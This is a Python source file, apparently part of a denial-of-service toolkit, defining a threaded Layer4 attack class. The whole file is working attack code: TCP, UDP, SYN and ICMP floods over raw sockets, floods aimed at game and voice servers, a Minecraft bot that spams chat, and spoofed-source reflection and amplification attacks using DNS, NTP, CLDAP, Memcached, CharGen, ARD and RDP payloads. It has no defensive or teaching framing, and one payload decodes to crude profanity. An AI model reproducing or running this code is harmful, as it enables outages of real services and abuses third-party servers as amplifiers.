from contextlib import suppress
from itertools import cycle
from os import urandom as randbytes
from random import choice as randchoice, randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket)
from threading import Event, Thread
from time import sleep
from typing import Any, List, Set, Tuple
from uuid import uuid4

from PyRoxy import Proxy
from PyRoxy import Tools as ProxyTools
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from base64 import b64encode

from core.tools import Tools
from config.environment import __ip__, con
from core.minecraft import Minecraft
from core.counters import REQUESTS_SENT, BYTES_SENT


class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "FIVEM-TOKEN": self.FIVEMTOKEN,
            "OVH-UDP": self.OVHUDP, 
            "DISCORD": self.DISCORD,
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b'\x00')

        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake):
                Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        global REQUESTS_SENT
        with suppress(Exception):
            Thread(target=self.alive_connection).start()
            REQUESTS_SENT += 1

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue
        Tools.safe_close(s)

    def OVHUDP(self) -> None:
        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while True:
                for payload in self._generate_ovhudp():
                    Tools.sendto(s, payload, self._target)
        Tools.safe_close(s)

    def ICMP(self) -> None:
        payload = self._genrate_icmp()
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def SYN(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, self._genrate_syn(), self._target):
                continue
        Tools.safe_close(s)

    def AMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads)):
                continue
        Tools.safe_close(s)

    def MCBOT(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                        self.protocolid,
                                                        2,
                                                        ProxyTools.Random.rand_ipv4(),
                                                        uuid4()))
            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.send(s, Minecraft.login(self.protocolid, username))
            
            sleep(1.5)

            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))

            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)

        Tools.safe_close(s)

    def VSE(self) -> None:
        global BYTES_SENT, REQUESTS_SENT
        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def DISCORD(self) -> None:
        payload = self._generate_discord()
        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEMTOKEN(self) -> None:
        global BYTES_SENT, REQUESTS_SENT

        # Generete token and guid
        token = str(uuid4())
        steamid_min = 76561197960265728
        steamid_max = 76561199999999999
        guid = str(randint(steamid_min, steamid_max))

        # Build Payload
        payload_str = f"token={token}&guid={guid}"
        payload = payload_str.encode('utf-8')

        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEM(self) -> None:
        global BYTES_SENT, REQUESTS_SENT
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def TS3(self) -> None:
        global BYTES_SENT, REQUESTS_SENT
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def MCPE(self) -> None:
        global BYTES_SENT, REQUESTS_SENT
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def _generate_ovhudp(self) -> List[bytes]:
        packets = []

        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
        paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0',
                 '\\0\\0\\0\\0\\0\\0\\', '/', '/null', '/%00%00%00%00']

        for _ in range(randint(2, 4)):
            ip = IP()
            ip.set_ip_src(__ip__)
            ip.set_ip_dst(self._target[0])

            udp = UDP()
            udp.set_uh_sport(randint(1024, 65535))
            udp.set_uh_dport(self._target[1])

            payload_size = randint(1024, 2048)
            random_part = randbytes(payload_size).decode("latin1", "ignore")

            method = randchoice(methods)
            path = randchoice(paths)

            payload_str = (
                f"{method} {path}{random_part} HTTP/1.1\n"
                f"Host: {self._target[0]}:{self._target[1]}\r\n\r\n"
            )

            payload = payload_str.encode("latin1", "ignore")

            udp.contains(Data(payload))
            ip.contains(udp)

            packets.append(ip.get_packet())

        return packets

    def _generate_discord(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        udp: UDP = UDP()
        udp.set_uh_sport(ProxyTools.Random.rand_int(32768, 65535))
        udp.set_uh_dport(self._target[1])
        payload_data = bytes([ProxyTools.Random.rand_int(0, 255) for _ in range(40)])
        udp.contains(Data(payload_data))
        ip.contains(udp)
        return ip.get_packet()

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: ICMP = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
            elif name == "ICMP":
                self.SENT_FLOOD = self.ICMP
                self._target = (self._target[0], 0)
            elif name == "RDP":
                self._amp_payload = (
                    b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                    3389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CLDAP":
                self._amp_payload = (
                    b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                    b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
                    389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "MEM":
                self._amp_payload = (
                    b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CHAR":
                self._amp_payload = (b'\x01', 19)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "ARD":
                self._amp_payload = (b'\x00\x14\x00\x00', 3283)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "NTP":
                self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "DNS":
                self._amp_payload = (
                    b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                    b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                    53)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())